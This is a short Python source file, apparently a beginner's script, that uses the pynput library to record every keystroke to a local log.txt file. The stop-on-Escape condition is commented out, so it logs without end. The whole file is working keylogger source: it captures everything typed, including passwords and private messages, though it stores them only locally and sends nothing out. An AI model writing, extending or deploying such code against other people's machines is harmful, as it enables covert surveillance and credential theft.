from pynput.keyboard import Key, Listener
import logging


#if no name it gets put into an empty string
log_dir = ""


#This is a basic logging function
logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(message)s:')


#this is from the library
def on_press(key):
    logging.info(str(key))
    #if key == Key.esc:
         # Stop listener
        #return False


#this says, listener is on
with Listener(on_press=on_press) as listener:
    listener.join()